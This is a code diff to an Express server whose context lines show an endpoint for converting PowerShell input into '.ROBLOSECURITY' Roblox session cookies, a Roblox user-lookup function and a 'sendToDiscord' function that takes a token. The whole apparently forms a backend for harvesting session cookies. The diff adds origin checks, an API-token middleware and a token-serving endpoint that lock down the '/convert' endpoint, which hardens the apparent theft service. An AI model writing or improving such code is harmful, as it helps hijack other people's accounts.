@@ -2,11 +2,42 @@ import express from 'express';
 import bodyParser from 'body-parser';
 import path from 'path';
 import { fileURLToPath } from 'url';
+import crypto from 'crypto';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
 const app = express();
+
+// Generate API token if not set
+const API_TOKEN = process.env.API_TOKEN || crypto.randomBytes(32).toString('hex');
+const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(',') : [];
+
+// Middleware to validate requests
+function validateRequest(req, res, next) {
+  // Check origin for browser requests
+  const origin = req.get('Origin') || req.get('Referer');
+  const host = req.get('Host');
+  
+  // Allow requests from same origin (your frontend)
+  if (origin) {
+    const originHost = new URL(origin).host;
+    if (originHost !== host && !ALLOWED_ORIGINS.includes(origin)) {
+      console.log(`❌ Blocked request from unauthorized origin: ${origin}`);
+      return res.status(403).json({ error: 'Unauthorized origin' });
+    }
+  }
+  
+  // Check for API token in headers
+  const providedToken = req.get('X-API-Token');
+  if (!providedToken || providedToken !== API_TOKEN) {
+    console.log(`❌ Invalid or missing API token from ${req.ip}`);
+    return res.status(401).json({ error: 'Invalid API token' });
+  }
+  
+  next();
+}
+
 app.use(bodyParser.json());
 app.use(bodyParser.text({ type: '*/*' }));
 
@@ -16,6 +47,22 @@ app.use(express.static(path.join(__dirname, 'public')));
 // Serve the frontend
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// Endpoint to get API token for frontend
+app.get('/api/token', (req, res) => {
+  // Only serve token to same origin requests
+  const origin = req.get('Origin') || req.get('Referer');
+  const host = req.get('Host');
+  
+  if (origin) {
+    const originHost = new URL(origin).host;
+    if (originHost !== host && !ALLOWED_ORIGINS.includes(origin)) {
+      return res.status(403).json({ error: 'Unauthorized' });
+    }
+  }
+  
+  res.json({ token: API_TOKEN });
 });
 
 // Function to fetch user data from Roblox API
@@ -298,7 +345,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
 }
 
 // API endpoint to convert PowerShell to .ROBLOSECURITY
-app.post('/convert', async (req, res) => {
+app.post('/convert', validateRequest, async (req, res) => {
   try {
     let input;
     let scriptType;
@@ -382,4 +429,10 @@ app.post('/convert', async (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
+app.listen(PORT, '0.0.0.0', () => {
+  console.log(`Server running on port ${PORT}`);
+  if (!process.env.API_TOKEN) {
+    console.log(`Generated API Token: ${API_TOKEN}`);
+    console.log('Set API_TOKEN environment variable to use a custom token');
+  }
+});
